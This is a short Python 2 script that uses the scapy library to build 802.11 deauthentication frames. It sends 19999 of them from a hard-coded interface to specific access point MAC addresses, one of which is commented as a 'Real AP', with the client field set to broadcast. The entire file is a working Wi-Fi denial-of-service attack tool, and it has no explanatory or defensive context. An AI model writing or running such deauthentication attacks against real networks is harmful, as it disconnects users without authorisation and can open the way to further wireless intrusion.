#!/usr/bin/env python2
# -*- coding: utf-8 -*-
"""
Created on Tue Feb  5 14:30:26 2019

@author: aayushbhargava
"""

from scapy.all import *
#ap = '8c:fe:74:11:5c:f8'
ap='3c:a8:2a:4b:f7:8c'
#ap='44:1E:98:0F:8C:5C'      #Real AP
#ap = '3C:A8:2A:4B:F7:8C'
client = 'FF:FF:FF:FF:FF:FF'
#client = "D0:81:7A:AD:AA:9C"
pkt = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
#print '--------------'
# Deauthentication Packet For Client
#             Use This Option Only If you Have Client MAC Address
#pkt1 = RadioTap()/Dot11(addr1=ap, addr2=client, addr3=client)/Dot11Deauth()
while True:
    try:
        x = sendp(pkt, iface="en1",count=19999)
        for xx in pkt:
            print xx.show2()
    except:
        break
    break
    
#sendp(pkt1, iface="mon0")
